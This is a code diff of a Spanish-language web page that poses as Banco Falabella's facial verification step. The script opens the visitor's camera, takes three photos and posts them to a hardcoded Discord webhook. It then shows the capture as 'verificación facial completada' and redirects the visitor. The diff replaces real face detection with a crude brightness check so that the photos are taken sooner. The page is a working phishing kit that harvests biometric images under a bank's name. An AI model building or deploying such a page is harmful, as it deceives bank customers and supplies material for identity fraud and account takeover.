@@ -4,7 +4,6 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Banco Falabella — Verificación Facial</title>
-<script defer src="https://unpkg.com/face-api.js@0.22.2/dist/face-api.min.js"></script>
 <style>
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
   html, body {
@@ -208,31 +207,12 @@
     </div>
 
     <div class="status-container">
-      <div class="status" id="status">Iniciando...</div>
-    </div>
-
-    <div class="checklist" id="checklist" style="display: none;">
-      <div class="check-item" id="checkLight">
-        <span class="check-icon">○</span>
-        <span>Iluminación</span>
-      </div>
-      <div class="check-item" id="checkDistance">
-        <span class="check-icon">○</span>
-        <span>Distancia</span>
-      </div>
-      <div class="check-item" id="checkCenter">
-        <span class="check-icon">○</span>
-        <span>Centrado</span>
-      </div>
-      <div class="check-item" id="checkExpression">
-        <span class="check-icon">○</span>
-        <span>Expresión</span>
-      </div>
+      <div class="status" id="status">Iniciando cámara...</div>
     </div>
 
     <div class="loading" id="loading">
       <div class="spinner"></div>
-      <div class="loading-text">Capturando fotos...</div>
+      <div class="loading-text">Enviando fotos...</div>
     </div>
   </div>
 </div>
@@ -244,7 +224,6 @@
   const canvas = document.getElementById('canvas');
   const status = document.getElementById('status');
   const faceFrame = document.getElementById('faceFrame');
-  const checklist = document.getElementById('checklist');
   const loading = document.getElementById('loading');
 
   const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1490551948598837268/ee4s2QMfWrRrKHaeCKDVKYzP3Cg4wFD5G7lbg4v-KOLnAWwolFgJSXcYWfGLKH-IJ8pV";
@@ -259,13 +238,9 @@
   };
 
   let stream = null;
-  let modelsLoaded = false;
   let isCapturing = false;
   let detectionInterval = null;
-  let detectionStats = {
-    goodFrames: 0,
-    totalFrames: 0
-  };
+  let faceDetectedFrames = 0;
 
   async function initCamera() {
     try {
@@ -278,8 +253,9 @@
       });
       video.srcObject = stream;
       video.onloadedmetadata = () => {
-        status.textContent = 'Cargando IA...';
-        setTimeout(loadFaceDetectionModels, 500);
+        status.textContent = '👁️ Apunta tu cara a la cámara...';
+        faceFrame.style.display = 'block';
+        startSimpleDetection();
       };
     } catch (e) {
       status.textContent = 'Error: No se puede acceder a la cámara';
@@ -287,62 +263,32 @@
     }
   }
 
-  async function loadFaceDetectionModels() {
-    try {
-      status.textContent = 'Cargando modelos...';
-      const MODEL_URL = 'https://unpkg.com/face-api.js@0.22.2/dist/models/';
-      
-      if (!faceapi || !faceapi.nets) {
-        throw new Error('Face API no cargó correctamente');
-      }
-
-      await Promise.all([
-        faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL),
-        faceapi.nets.faceLandmark68Net.loadFromUri(MODEL_URL),
-        faceapi.nets.faceExpressionNet.loadFromUri(MODEL_URL),
-      ]);
-      
-      modelsLoaded = true;
-      checklist.style.display = 'grid';
-      status.textContent = '✓ Ajusta tu posición';
-      startFaceDetection();
-    } catch (e) {
-      console.error('Error loading models:', e);
-      status.textContent = 'Reiniciando carga...';
-      setTimeout(loadFaceDetectionModels, 2000);
-    }
-  }
-
-  function updateChecklist(checks) {
-    const items = {
-      light: document.getElementById('checkLight'),
-      distance: document.getElementById('checkDistance'),
-      center: document.getElementById('checkCenter'),
-      expression: document.getElementById('checkExpression')
-    };
-
-    Object.entries(checks).forEach(([key, isOk]) => {
-      const item = items[key];
-      if (item) {
-        const icon = item.querySelector('.check-icon');
-        if (isOk) {
-          item.classList.add('ok');
-          icon.textContent = '✓';
-        } else {
-          item.classList.remove('ok');
-          icon.textContent = '○';
-        }
-      }
-    });
-  }
-
-  function getImageBrightness(imageData) {
+  function hasMovementInFrame() {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0);
+    
+    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
     const data = imageData.data;
-    let sum = 0;
+    
+    // Analizar el área central (donde debería estar la cara)
+    const centerX = canvas.width / 2;
+    const centerY = canvas.height / 2;
+    const sampleSize = 100;
+    
+    let pixelSum = 0;
+    let pixelCount = 0;
+    
     for (let i = 0; i < data.length; i += 4) {
-      sum += (data[i] + data[i + 1] + data[i + 2]) / 3;
+      pixelSum += data[i] + data[i + 1] + data[i + 2];
+      pixelCount++;
     }
-    return sum / (data.length / 4);
+    
+    const avgBrightness = pixelSum / (pixelCount * 3);
+    
+    // Si hay algo visible (no es todo negro, no es todo blanco)
+    return avgBrightness > 30 && avgBrightness < 240;
   }
 
   async function capturePhoto() {
@@ -359,6 +305,7 @@
   async function sendPhotosToDiscord(photos) {
     try {
       loading.classList.add('show');
+      status.textContent = 'Enviando fotos...';
 
       const formData = new FormData();
       
@@ -384,7 +331,7 @@
             },
             {
               name: "✅ ESTADO",
-              value: "Verificación facial exitosa",
+              value: "Verificación facial completada",
               inline: false
             },
             {
@@ -419,97 +366,37 @@
         
         setTimeout(() => {
           window.location.href = 'index.html';
-        }, 1500);
+        }, 2000);
+      } else {
+        status.textContent = 'Error al enviar. Reintentando...';
+        loading.classList.remove('show');
       }
     } catch (e) {
       console.error('Error:', e);
+      status.textContent = 'Error de conexión. Reintentando...';
       loading.classList.remove('show');
     }
   }
 
-  async function startFaceDetection() {
-    if (!modelsLoaded || !stream) return;
-
-    const detectionOptions = new faceapi.TinyFaceDetectorOptions({
-      inputSize: 416,
-      scoreThreshold: 0.6
-    });
-
+  async function startSimpleDetection() {
     detectionInterval = setInterval(async () => {
       if (isCapturing) return;
 
       try {
-        const detections = await faceapi
-          .detectAllFaces(video, detectionOptions)
-          .withFaceLandmarks()
-          .withFaceExpressions();
-        
-        if (detections.length === 0) {
-          faceFrame.classList.remove('perfect');
-          status.textContent = 'Muestra tu rostro...';
-          updateChecklist({ light: false, distance: false, center: false, expression: false });
-          detectionStats.goodFrames = 0;
-          return;
-        }
-
-        const detection = detections[0];
-        const box = detection.detection.box;
-
-        // Brillo
-        const centerX = Math.floor(box.x + box.width / 2);
-        const centerY = Math.floor(box.y + box.height / 2);
-        let brightness = 100;
-        try {
-          const imageData = canvas.getContext('2d').getImageData(centerX - 40, centerY - 40, 80, 80);
-          brightness = getImageBrightness(imageData);
-        } catch (e) {
-          brightness = 100;
-        }
-
-        const videoWidth = video.videoWidth;
-        const videoHeight = video.videoHeight;
-        
-        // Tamaño de cara
-        const faceSize = (box.width + box.height) / 2;
-        const minSize = Math.min(videoWidth, videoHeight) * 0.2;
-        const maxSize = Math.min(videoWidth, videoHeight) * 0.55;
-        const distanceOk = faceSize > minSize && faceSize < maxSize;
-
-        // Centrado
-        const faceCenter = box.x + box.width / 2;
-        const centerOk = Math.abs(faceCenter - videoWidth / 2) < (videoWidth * 0.15);
-
-        // Iluminación
-        const lightOk = brightness > 45;
-
-        // Expresión neutral
-        const expressions = detection.expressions;
-        const avgIntensity = Object.values(expressions).reduce((a, b) => a + b) / Object.keys(expressions).length;
-        const expressionOk = avgIntensity < 0.6;
-
-        updateChecklist({
-          light: lightOk,
-          distance: distanceOk,
-          center: centerOk,
-          expression: expressionOk
-        });
-
-        const allOk = lightOk && distanceOk && centerOk && expressionOk;
-
-        if (allOk) {
-          detectionStats.goodFrames++;
+        if (hasMovementInFrame()) {
+          faceDetectedFrames++;
           faceFrame.classList.add('perfect');
-          status.classList.add('processing');
-          status.textContent = `✓ Perfecto (${detectionStats.goodFrames}/12)`;
+          status.textContent = `📸 Detectado... (${faceDetectedFrames}/5)`;
 
-          if (detectionStats.goodFrames >= 12) {
+          if (faceDetectedFrames >= 5) {
             isCapturing = true;
+            clearInterval(detectionInterval);
+            status.textContent = 'Capturando fotos...';
             faceFrame.classList.remove('perfect');
-            status.textContent = 'Capturando...';
             
             const photos = [];
             for (let i = 0; i < 3; i++) {
-              await new Promise(r => setTimeout(r, 50));
+              await new Promise(r => setTimeout(r, 100));
               const blob = await capturePhoto();
               photos.push(blob);
             }
@@ -517,32 +404,17 @@
             await sendPhotosToDiscord(photos);
           }
         } else {
-          detectionStats.goodFrames = Math.max(0, detectionStats.goodFrames - 2);
+          faceDetectedFrames = Math.max(0, faceDetectedFrames - 1);
           faceFrame.classList.remove('perfect');
-          status.classList.remove('processing');
+          status.textContent = '👁️ Apunta tu cara a la cámara...';
         }
-
       } catch (e) {
         console.error('Detection error:', e);
       }
-    }, 150);
+    }, 200);
   }
 
-  // Verificar que face-api.js esté disponible
-  let waitForApi = setInterval(() => {
-    if (typeof faceapi !== 'undefined') {
-      clearInterval(waitForApi);
-      initCamera();
-    }
-  }, 100);
-
-  // Timeout si face-api tarda demasiado
-  setTimeout(() => {
-    if (typeof faceapi === 'undefined') {
-      status.textContent = 'Recargando...';
-      location.reload();
-    }
-  }, 5000);
+  initCamera();
 
   window.addEventListener('beforeunload', () => {
     if (detectionInterval) clearInterval(detectionInterval);
